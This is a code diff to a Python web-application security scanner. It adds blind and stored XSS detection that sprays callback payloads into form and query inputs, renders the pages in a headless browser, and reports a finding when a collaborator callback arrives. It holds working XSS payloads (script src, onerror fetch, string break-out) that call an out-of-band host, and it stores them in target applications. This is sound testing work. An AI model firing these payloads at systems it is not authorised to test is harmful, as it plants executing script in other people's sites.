@@ -12,13 +12,14 @@ Playwright is imported lazily so the rest of dastcore works without it installed
 
 from __future__ import annotations
 
+import asyncio
 import json
 import re
 from collections import deque
 from urllib.parse import parse_qsl, urlsplit
 
 from dastcore.config import ScopeConfig
-from dastcore.core.models import Finding, HttpRequest
+from dastcore.core.models import Evidence, Finding, HttpRequest, HttpResponse, InjectionPoint
 from dastcore.core.scope import ScopeChecker
 from dastcore.detectors.csti import probe_csti
 from dastcore.detectors.dom_xss import probe_dom_xss
@@ -101,6 +102,45 @@ _DANGEROUS_LABEL = re.compile(
 def _is_dangerous(label: str) -> bool:
     """True if an element's visible text/label suggests a state-changing action we must not click."""
     return bool(_DANGEROUS_LABEL.search(label or ""))
+
+
+# Blind/stored-XSS beacons: each fetches the collaborator URL (``{u}``) ONLY if injected script runs —
+# a script element, an attribute break-out into a script, an event handler, and a JS-string break-out —
+# so a callback proves execution. {u} carries a per-point token, correlating the callback to its source.
+_BLIND_XSS_BEACONS = (
+    '"><script src="{u}"></script>',
+    '<script src="{u}"></script>',
+    '<img src=x onerror="fetch(\'{u}\')">',
+    "';fetch('{u}');//",
+)
+
+
+def _blind_xss_finding(url: str, location: str, name: str) -> Finding:
+    request = HttpRequest(method="GET", url=url)
+    return Finding(
+        id=f"xss-blind-oob:{url}:{location}:{name}",
+        rule_id="xss-blind-oob",
+        name="Blind / stored XSS (OAST-confirmed)",
+        severity="high",
+        cwe="CWE-79",
+        owasp="WSTG-CLNT-01",
+        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
+        family="xss",
+        injection_point=InjectionPoint(location=location, name=name, base_value="", request_template=request),  # type: ignore[arg-type]
+        evidence=[Evidence(
+            type="oob",
+            data=(f"un beacon XSS inyectado en '{name}' ({location}) se EJECUTÓ en el navegador y llamó al "
+                  "colaborador — XSS ciego/almacenado (el payload corre en otra página o más tarde)")[:300],
+            confidence="high",
+        )],
+        request=request,
+        response=HttpResponse(status_code=0, url=url),
+        remediation=(
+            "Codifica según contexto TODA la entrada del usuario al renderizarla (incluida la que se guarda y se "
+            "muestra en otra página o panel de administración), y aplica una Content-Security-Policy que bloquee "
+            "scripts en línea y orígenes no confiables."
+        ),
+    )
 
 
 class HeadlessUnavailableError(RuntimeError):
@@ -445,6 +485,98 @@ class HeadlessEngine:
             await self._maybe_recycle()
             findings.extend(await probe_csti(self._context, req))
         return findings
+
+    # --- blind / stored XSS via OAST --------------------------------------------------
+
+    async def scan_blind_xss_oob(self, requests, oast, *, max_points: int = 20) -> list[Finding]:
+        """Blind / stored XSS confirmed out-of-band. Spray a per-point collaborator beacon into form and
+        query inputs, then render the pages in the real browser so any *stored* or *reflected* payload
+        EXECUTES; a beacon calls back only if injected script actually ran, so this is zero-false-positive
+        (it catches XSS that surfaces on another page or later, which the reflected/DOM checks miss).
+
+        Needs a live OAST provider; without one it is a no-op. Each injection point gets a unique token,
+        so a callback maps back to the exact point."""
+        if oast is None or not getattr(oast, "is_available", lambda: False)():
+            return []
+        from dastcore.engine.injection_points import extract_injection_points
+        from dastcore.engine.rule_engine import build_mutated_request
+
+        token_to_point: dict[str, tuple[str, str, str]] = {}  # token -> (url, location, name)
+        reflected_urls: list[str] = []
+        seen: set[tuple[str, str, str]] = set()
+        for req in requests:
+            if len(token_to_point) >= max_points:
+                break
+            for point in extract_injection_points(req, include_headers=False):
+                if point.location not in ("query", "body"):
+                    continue
+                sig = (urlsplit(req.url).path or "/", point.location, point.name)
+                if sig in seen:
+                    continue
+                seen.add(sig)
+                if len(token_to_point) >= max_points:
+                    break
+                handle = oast.new_handle()
+                token_to_point[handle.token] = (req.url, point.location, point.name)
+                for template in _BLIND_XSS_BEACONS:
+                    await self._deliver_beacon(build_mutated_request(point, template.format(u=handle.url)),
+                                               reflected_urls)
+
+        # Render discovered pages (stored beacons fire) + each sprayed GET URL (reflected beacons fire).
+        page_urls = [r.url for r in requests if r.method == "GET" and self._scope.is_in_scope(r.url)]
+        for url in list(dict.fromkeys(reflected_urls + page_urls))[:self._max_pages]:
+            if self._nav_count >= self._max_navigations:
+                break
+            await self._maybe_recycle()
+            await self._render(url)
+
+        interactions: list = []
+        for _ in range(6):  # give the beacons time to call back
+            await asyncio.sleep(1.0)
+            interactions.extend(await oast.poll())
+            if any(i.token in token_to_point for i in interactions):
+                break
+
+        findings: list[Finding] = []
+        reported: set[str] = set()
+        for interaction in interactions:
+            if interaction.token in token_to_point and interaction.token not in reported:
+                reported.add(interaction.token)
+                url, location, name = token_to_point[interaction.token]
+                findings.append(_blind_xss_finding(url, location, name))
+        return findings
+
+    async def _deliver_beacon(self, mutated: HttpRequest, reflected_urls: list[str]) -> None:
+        """Store/reflect one beacon: a GET is queued to be navigated (renders reflected, may store); a
+        body request is POSTed via the browser's session so a stored payload lands with the right cookies."""
+        if not self._scope.is_in_scope(mutated.url):
+            return
+        if mutated.method == "GET":
+            reflected_urls.append(mutated.url)
+            return
+        try:
+            await self._context.request.fetch(
+                mutated.url, method=mutated.method, form=(mutated.data or {}), timeout=self._nav_timeout
+            )
+        except Exception:  # noqa: BLE001 — a failed spray on one point must not abort the rest
+            pass
+
+    async def _render(self, url: str) -> None:
+        """Navigate to ``url`` and let the page settle so any injected beacon executes. Best-effort."""
+        if not self._scope.is_in_scope(url):
+            return
+        page = await self._context.new_page()
+        try:
+            await page.goto(url, wait_until="load", timeout=self._nav_timeout)
+            await page.wait_for_timeout(300)
+            try:
+                await page.wait_for_load_state("networkidle", timeout=2000)
+            except Exception:  # noqa: BLE001
+                pass
+        except Exception:  # noqa: BLE001 — a bad page must not abort the render pass
+            pass
+        finally:
+            await page.close()
 
     # --- helpers ----------------------------------------------------------------------
 
